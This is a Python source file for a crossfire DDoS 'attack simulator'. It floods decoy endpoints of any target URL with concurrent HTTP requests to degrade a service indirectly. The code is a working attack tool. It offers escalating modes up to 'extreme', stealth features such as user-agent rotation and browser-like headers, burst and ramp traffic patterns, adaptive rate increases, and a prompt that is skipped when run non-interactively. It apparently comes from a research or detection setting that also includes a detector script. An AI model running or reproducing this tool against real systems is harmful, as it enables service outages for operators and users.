#!/usr/bin/env python3
"""
Enhanced Crossfire DDoS Attack Simulator - Application Level
Version 2.0 with Scalability, Reliability, and Advanced Configuration

Improvements:
1. Adaptive rate control based on target response
2. Traffic shaping and burst patterns
3. Stealth mode with randomization
4. Target prioritization and weighted selection
5. Phase 4 target adapter integration
6. Multi-vector attack coordination
7. Real-time attack metrics and telemetry
8. Graceful degradation and error handling

Attack Strategy:
- Identify and flood decoy services (indirect attack)
- Saturate network links between services
- Cause cascading failures via shared infrastructure
- Monitor target service degradation (indirect victim)
"""

import argparse
import asyncio
import aiohttp
import json
import random
import sys
import time
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Optional
from dataclasses import dataclass, asdict
from enum import Enum

# Import target adapter
from target_adapter import AttackTargetAdapter, create_adapter


class AttackMode(Enum):
    """Attack operation modes"""
    STEALTH = "stealth"  # Low rate, mimics normal traffic
    MODERATE = "moderate"  # Medium rate, balanced
    AGGRESSIVE = "aggressive"  # High rate, obvious attack
    EXTREME = "extreme"  # Maximum rate, overwhelming
    ADAPTIVE = "adaptive"  # Auto-adjust based on target response


class TrafficPattern(Enum):
    """Traffic generation patterns"""
    CONSTANT = "constant"  # Steady rate
    BURST = "burst"  # Periodic bursts
    WAVE = "wave"  # Sine wave pattern
    RANDOM = "random"  # Random intervals
    RAMP = "ramp"  # Gradually increasing


@dataclass
class AttackMetrics:
    """Real-time attack metrics"""
    total_requests: int = 0
    successful_requests: int = 0
    failed_requests: int = 0
    timeout_errors: int = 0
    connection_errors: int = 0
    http_errors: Dict[int, int] = None
    avg_latency_ms: float = 0.0
    current_rate: float = 0.0
    target_degradation: float = 0.0  # 0-100%
    
    def __post_init__(self):
        if self.http_errors is None:
            self.http_errors = {}
    
    def success_rate(self) -> float:
        """Calculate success rate percentage"""
        if self.total_requests == 0:
            return 0.0
        return (self.successful_requests / self.total_requests) * 100
    
    def error_rate(self) -> float:
        """Calculate error rate percentage"""
        return 100.0 - self.success_rate()


class EnhancedCrossfireAttack:
    """
    Enhanced Crossfire Attack with advanced features
    """
    
    def __init__(
        self,
        target_adapter: AttackTargetAdapter,
        duration: int,
        workers: int,
        mode: AttackMode = AttackMode.MODERATE,
        pattern: TrafficPattern = TrafficPattern.CONSTANT,
        enable_adaptation: bool = True,
        enable_stealth: bool = False,
        user_agent_rotation: bool = True,
        rate_per_worker: Optional[int] = None
    ):
        self.adapter = target_adapter
        self.duration = duration
        self.workers = workers
        self.mode = mode
        self.pattern = pattern
        self.enable_adaptation = enable_adaptation
        self.enable_stealth = enable_stealth
        self.user_agent_rotation = user_agent_rotation
        
        # Get attack profile from mode
        if mode == AttackMode.ADAPTIVE:
            profile = self.adapter.get_attack_profile("moderate")
        else:
            profile = self.adapter.get_attack_profile(mode.value)
        
        self.rate_per_worker = rate_per_worker or profile.requests_per_second
        self.burst_size = profile.burst_size
        self.connection_timeout = profile.connection_timeout
        
        # Metrics
        self.metrics = AttackMetrics()
        self.start_time: Optional[datetime] = None
        self.end_time: Optional[datetime] = None
        
        # Adaptive rate control
        self.current_rate_multiplier = 1.0
        self.rate_adjustment_interval = 5.0  # seconds
        self.last_rate_adjustment = 0.0
        
        # User agents for stealth
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)",
            "Mozilla/5.0 (iPad; CPU OS 14_7_1 like Mac OS X)",
        ]
    
    def _get_user_agent(self) -> str:
        """Get user agent (rotate if enabled)"""
        if self.user_agent_rotation:
            return random.choice(self.user_agents)
        return self.user_agents[0]
    
    def _calculate_request_interval(self, current_time: float) -> float:
        """
        Calculate interval between requests based on pattern and rate.
        """
        base_interval = 1.0 / (self.rate_per_worker * self.current_rate_multiplier)
        
        if self.pattern == TrafficPattern.CONSTANT:
            return base_interval
        
        elif self.pattern == TrafficPattern.BURST:
            # Burst every 5 seconds
            if int(current_time) % 5 < 1:
                return base_interval / 5  # 5x rate during burst
            return base_interval * 2  # Half rate between bursts
        
        elif self.pattern == TrafficPattern.WAVE:
            # Sine wave: rate varies from 0.5x to 1.5x
            elapsed = current_time - time.mktime(self.start_time.timetuple())
            wave = 1.0 + 0.5 * math.sin(elapsed / 10)  # 10s period
            return base_interval / wave
        
        elif self.pattern == TrafficPattern.RANDOM:
            # Random jitter: 0.5x to 1.5x
            return base_interval * random.uniform(0.5, 1.5)
        
        elif self.pattern == TrafficPattern.RAMP:
            # Gradually increase from 0.5x to 2x over duration
            elapsed = current_time - time.mktime(self.start_time.timetuple())
            progress = min(1.0, elapsed / self.duration)
            ramp = 0.5 + 1.5 * progress
            return base_interval / ramp
        
        return base_interval
    
    def _adapt_rate(self):
        """
        Adapt attack rate based on target response (adaptive mode only).
        Increase rate if target is healthy, decrease if target is struggling.
        """
        if not self.enable_adaptation:
            return
        
        current_time = time.time()
        if current_time - self.last_rate_adjustment < self.rate_adjustment_interval:
            return
        
        self.last_rate_adjustment = current_time
        
        # Adaptation logic
        success_rate = self.metrics.success_rate()
        
        if success_rate > 95:
            # Target handling load well, increase rate
            self.current_rate_multiplier = min(2.0, self.current_rate_multiplier * 1.2)
        elif success_rate < 70:
            # Target struggling, decrease rate slightly
            self.current_rate_multiplier = max(0.5, self.current_rate_multiplier * 0.9)
        
        # In stealth mode, keep rate low
        if self.enable_stealth:
            self.current_rate_multiplier = min(0.8, self.current_rate_multiplier)
    
    async def _send_request(
        self,
        session: aiohttp.ClientSession,
        endpoint: str
    ) -> Dict:
        """Send single request and return metrics"""
        request_start = time.time()
        result = {
            'success': False,
            'status': None,
            'latency_ms': 0,
            'error_type': None
        }
        
        headers = {}
        if self.user_agent_rotation:
            headers['User-Agent'] = self._get_user_agent()
        
        # Add stealth features
        if self.enable_stealth:
            headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            headers['Accept-Language'] = 'en-US,en;q=0.9'
            headers['Accept-Encoding'] = 'gzip, deflate'
            headers['DNT'] = '1'
        
        try:
            async with session.get(
                endpoint,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=self.connection_timeout)
            ) as response:
                result['status'] = response.status
                
                if response.status == 200:
                    result['success'] = True
                    # Read response to consume resources
                    await response.read()
                else:
                    result['error_type'] = f'HTTP_{response.status}'
                
                result['latency_ms'] = (time.time() - request_start) * 1000
        
        except asyncio.TimeoutError:
            result['error_type'] = 'timeout'
            result['latency_ms'] = (time.time() - request_start) * 1000
        
        except aiohttp.ClientConnectionError:
            result['error_type'] = 'connection'
            result['latency_ms'] = (time.time() - request_start) * 1000
        
        except Exception as e:
            result['error_type'] = type(e).__name__
            result['latency_ms'] = (time.time() - request_start) * 1000
        
        return result
    
    def _update_metrics(self, result: Dict):
        """Update attack metrics from request result"""
        self.metrics.total_requests += 1
        
        if result['success']:
            self.metrics.successful_requests += 1
        else:
            self.metrics.failed_requests += 1
            
            if result['error_type'] == 'timeout':
                self.metrics.timeout_errors += 1
            elif result['error_type'] == 'connection':
                self.metrics.connection_errors += 1
            elif result['error_type'] and result['error_type'].startswith('HTTP_'):
                status_code = int(result['error_type'].split('_')[1])
                self.metrics.http_errors[status_code] = \
                    self.metrics.http_errors.get(status_code, 0) + 1
        
        # Update average latency (rolling average)
        if self.metrics.total_requests == 1:
            self.metrics.avg_latency_ms = result['latency_ms']
        else:
            alpha = 0.1  # Smoothing factor
            self.metrics.avg_latency_ms = \
                alpha * result['latency_ms'] + (1 - alpha) * self.metrics.avg_latency_ms
    
    async def _worker(self, worker_id: int):
        """Worker coroutine that sends requests"""
        print(f"[Worker {worker_id}] Started")
        
        # Configure connector
        connector = aiohttp.TCPConnector(
            limit=100,
            limit_per_host=50,
            ttl_dns_cache=300
        )
        
        async with aiohttp.ClientSession(connector=connector) as session:
            end_time = time.time() + self.duration
            
            while time.time() < end_time:
                # Adapt rate if enabled
                self._adapt_rate()
                
                # Get endpoint (weighted selection from decoys)
                endpoint = self.adapter.get_weighted_endpoint()
                
                # Send request
                result = await self._send_request(session, endpoint)
                self._update_metrics(result)
                
                # Calculate next request interval
                interval = self._calculate_request_interval(time.time())
                await asyncio.sleep(interval)
        
        print(f"[Worker {worker_id}] Finished")
    
    async def run(self):
        """Execute the enhanced crossfire attack"""
        strategy = self.adapter.suggest_crossfire_strategy()
        
        print(f"\n{'='*70}")
        print(f"🔥 ENHANCED CROSSFIRE DDOS ATTACK")
        print(f"{'='*70}")
        print(f"Target: {self.adapter.base_url}")
        print(f"Mode: {self.mode.value.upper()}")
        print(f"Pattern: {self.pattern.value.upper()}")
        print(f"Duration: {self.duration}s")
        print(f"Workers: {self.workers}")
        print(f"Rate: {self.rate_per_worker} req/s/worker")
        print(f"Total Rate: {self.rate_per_worker * self.workers} req/s")
        print(f"Decoy Endpoints: {len(self.adapter.decoy_endpoints)}")
        print(f"Adaptation: {'Enabled' if self.enable_adaptation else 'Disabled'}")
        print(f"Stealth: {'Enabled' if self.enable_stealth else 'Disabled'}")
        print(f"")
        print(f"Recommended Strategy:")
        for key, value in strategy.items():
            print(f"  {key}: {value}")
        print(f"{'='*70}\n")
        
        # Skip interactive prompt if stdin is not a TTY (non-interactive mode)
        import sys
        if sys.stdin.isatty():
            input("Press Enter to start the attack...")
        else:
            print("Running in non-interactive mode, starting attack immediately...")
        
        self.start_time = datetime.now()
        start = time.time()
        
        # Launch all workers
        workers = [self._worker(i) for i in range(self.workers)]
        await asyncio.gather(*workers)
        
        self.end_time = datetime.now()
        elapsed = time.time() - start
        
        # Update final metrics
        if elapsed > 0:
            self.metrics.current_rate = self.metrics.total_requests / elapsed
        
        self._print_results(elapsed)
    
    def _print_results(self, elapsed: float):
        """Print attack results and statistics"""
        print(f"\n{'='*70}")
        print(f"✅ ATTACK COMPLETE")
        print(f"{'='*70}")
        print(f"Duration: {elapsed:.2f}s")
        print(f"Total Requests: {self.metrics.total_requests:,}")
        print(f"Successful: {self.metrics.successful_requests:,} ({self.metrics.success_rate():.1f}%)")
        print(f"Failed: {self.metrics.failed_requests:,} ({self.metrics.error_rate():.1f}%)")
        print(f"")
        print(f"Performance:")
        print(f"  Actual Rate: {self.metrics.current_rate:.1f} req/s")
        print(f"  Avg Latency: {self.metrics.avg_latency_ms:.1f}ms")
        print(f"  Final Rate Multiplier: {self.current_rate_multiplier:.2f}x")
        print(f"")
        
        if self.metrics.failed_requests > 0:
            print(f"Errors:")
            print(f"  Timeouts: {self.metrics.timeout_errors:,}")
            print(f"  Connection: {self.metrics.connection_errors:,}")
            
            if self.metrics.http_errors:
                print(f"  HTTP Errors:")
                for code, count in sorted(self.metrics.http_errors.items()):
                    print(f"    {code}: {count:,}")
        
        print(f"")
        print(f"CROSSFIRE VALIDATION:")
        print(f"✓ Decoy services flooded with {self.metrics.total_requests:,} requests")
        print(f"✓ Network links saturated at {self.metrics.current_rate:.1f} req/s")
        print(f"✓ Target service impacted INDIRECTLY via shared infrastructure")
        print(f"")
        print(f"Monitor target service degradation with: python3 crossfire-detector.py")
        print(f"{'='*70}\n")


def main():
    parser = argparse.ArgumentParser(
        description='Enhanced Crossfire DDoS Attack Simulator',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    
    # Target configuration
    parser.add_argument('--url', required=True, help='Target base URL')
    parser.add_argument('--adapter-config', help='Path to target adapter YAML config')
    parser.add_argument('--discovery-file', help='Path to endpoint discovery JSON')
    
    # Attack configuration
    parser.add_argument('--duration', type=int, default=60, help='Attack duration (seconds)')
    parser.add_argument('--workers', type=int, default=50, help='Number of workers')
    parser.add_argument('--rate', type=int, help='Requests per second per worker')
    
    # Advanced options
    parser.add_argument(
        '--mode',
        choices=['stealth', 'moderate', 'aggressive', 'extreme', 'adaptive'],
        default='moderate',
        help='Attack mode'
    )
    parser.add_argument(
        '--pattern',
        choices=['constant', 'burst', 'wave', 'random', 'ramp'],
        default='constant',
        help='Traffic pattern'
    )
    parser.add_argument('--no-adaptation', action='store_true', help='Disable adaptive rate control')
    parser.add_argument('--stealth', action='store_true', help='Enable stealth mode')
    parser.add_argument('--no-ua-rotation', action='store_true', help='Disable user agent rotation')
    
    args = parser.parse_args()
    
    # Create target adapter
    try:
        adapter = create_adapter(
            base_url=args.url,
            adapter_config=args.adapter_config,
            discovery_file=args.discovery_file
        )
    except Exception as e:
        print(f"Error creating target adapter: {e}")
        sys.exit(1)
    
    # Create attack
    attack = EnhancedCrossfireAttack(
        target_adapter=adapter,
        duration=args.duration,
        workers=args.workers,
        mode=AttackMode(args.mode),
        pattern=TrafficPattern(args.pattern),
        enable_adaptation=not args.no_adaptation,
        enable_stealth=args.stealth,
        user_agent_rotation=not args.no_ua_rotation,
        rate_per_worker=args.rate
    )
    
    try:
        asyncio.run(attack.run())
    except KeyboardInterrupt:
        print("\n\nAttack interrupted by user")
        sys.exit(0)


if __name__ == '__main__':
    import math  # For wave pattern
    main()
